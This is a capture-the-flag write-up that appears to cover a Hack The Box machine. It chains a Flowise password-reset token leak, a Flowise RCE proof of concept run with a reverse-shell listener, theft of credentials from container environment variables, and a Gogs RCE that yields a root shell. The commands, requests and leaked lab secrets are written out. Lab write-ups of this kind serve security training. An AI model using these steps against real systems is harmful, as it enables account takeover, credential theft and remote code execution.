``bash
============================================
  RECON SUMMARY
  Target:    10.129.30.123
  DNS:       silentium.htb
  Generated: 2026-04-13 09:31:26
============================================

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------

  [ http://silentium.htb ]
    301   /assets/

  [ http://staging.silentium.htb ]
    301   /assets/

--------------------------------------------
  SUBDOMAINS  (1 found)
--------------------------------------------
  staging.silentium.htb

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp     ssh            OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
  80/tcp     http           nginx 1.24.0 (Ubuntu)

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   80
  HTTPS:  none

============================================
```

We have 2 ports open. A website and ssh. There is also a subdomain called "staging". Let's check the website out. 

The website didn't have much on it so i decided to check out the subdomain.
It was just the login screen for flowise which is a place where you can create AI agents and such. I looked up for CVES. 

There is a login screen. I tried all the usernames in the main website and i was able to see that ben@silentium.htb is an account in there since it has a clear indication of it in the messages that pop up after trying to log in. 


https://nvd.nist.gov/vuln/detail/CVE-2025-58434

There is a CVE in the password mechanics. The forgot-password endpoint returns sensitive information including the token to reset the password without any authentication. 

Let's boot up burpsuite

```bash
POST /api/v1/account/forgot-password HTTP/1.1
Host: staging.silentium.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
x-request-from: internal
Content-Length: 38
Origin: http://staging.silentium.htb
Connection: keep-alive
Referer: http://staging.silentium.htb/forgot-password
Priority: u=0

{"user":{"email":"ben@silentium.htb"}}




HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 13 Apr 2026 14:42:19 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Access-Control-Allow-Origin: http://staging.silentium.htb
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-AjmrTWI+thawTQeHRS8UAPB1ibA"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"EHPbhqQxiAJzggkZbptib8irOviwX5ZJQPly0UMrqO38o6yKWqGWMk5rV8I9oGvO","tokenExpiry":"2026-04-13T14:57:19.650Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-13T14:42:19.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```


There we can see the temptoken which can be used to reset the password.

We were able to reset the password for the user ben. 

Ok now we are inside. When i was investingating the CVEs I found out that there
is a RCE which we are gonna try next. 

https://www.cvedetails.com/cve/CVE-2025-59528/
https://github.com/advisories/GHSA-3gcm-f6qx-ff7p
```bash
The vulnerability allows unauthenticated attackers to execute arbitrary JavaScript code on the server by injecting malicious payloads through the mcpServerConfig parameter of the CustomMCP node's API endpoint
``

I made a proof of concept for this so i just cloned it
https://github.com/vanhari/CVE-2025-59528

```bash
git clone https://github.com/vanhari/CVE-2025-59528.git
cd CVE-2025-59528
```


```bash
python3 CVE-2025-59528.py  -t "http://staging.silentium.htb" --api-key hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc --lhost 10.10.14.88 --lport 4444
```


Then we setup a listener now we have root access but its a container. Let's start enumerating.
```bash
/proc/1 # cat environ
FLOWISE_PASSWORD=F1l3_d0ck3rALLOW_UNAUTHORIZED_CERTS=trueNODE_VERSION=20.19.4HOSTNAME=c78c3cceb7baYARN_VERSION=1.22.22SMTP_PORT=1025SHLVL=1PORT=3000HOME=/rootSENDER_EMAIL=ben@silentium.htbPUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browserJWT_ISSUER=ISSUERJWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDDSMTP_USERNAME=testSMTP_SECURE=falseJWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200FLOWISE_USERNAME=benPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binDATABASE_PATH=/root/.flowiseJWT_TOKEN_EXPIRY_IN_MINUTES=360JWT_AUDIENCE=AUDIENCESECRETKEY_PATH=/root/.flowisePWD=/SMTP_PASSWORD=r04D!!_R4geSMTP_HOST=mailhogJWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDDSMTP_USER=test/proc/1 # cat environ | grep pass
/proc/1 # cat environ | grep PASS
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
```

Here we can find 2 passwords. Let's try them on the ssh.
The latter worked we were able to log in.

```bash
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
```

Then it's time to find a way to privesc.
I checked the ports running on the localhost adn there was smth called mailHog. Havent heard of it before, so i decided to port it over and check it out


```bash
ssh -L 8080:127.0.0.1:8025 ben@silentium.htb
```

```bash
MailHog is a lightweight, open-source fake SMTP testing server designed for developers to capture, view, and analyze outgoing emails from applications without sending them to real recipients.
```

After enumerating the machine for a while. I saw that the /opt had a few files in it

```bash
ben@silentium:/opt$ ls
containerd  gogs
```

I did some reseach and gogs has some CVEs.

```bash
ben@silentium:/opt/gogs/gogs$ /opt/gogs/gogs/gogs --version
Gogs version 0.13.3
```

https://www.cvedetails.com/version/2024306/Gogs-Gogs-0.13.3.html

https://www.upwind.io/feed/cve-2025-8110-gogs-rce-unpatched

```bash
A Proof of Concept (PoC) for CVE-2025-8110, a critical vulnerability in Gogs that allows Remote Code Execution (RCE) via .git/config manipulation using symbolic link bypasses and sshCommand injection.
```

Let's search up for a poc on github.
We found one. now we just need to setup a listner and run the script

```bash
nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.88] from (UNKNOWN) [10.129.31.192] 39768
bash: cannot set terminal process group (1485): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/3# cat /root/root.txt
cat /root/root.txt
94ee7778###3a6c32424a832e61a72
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/3# 
```


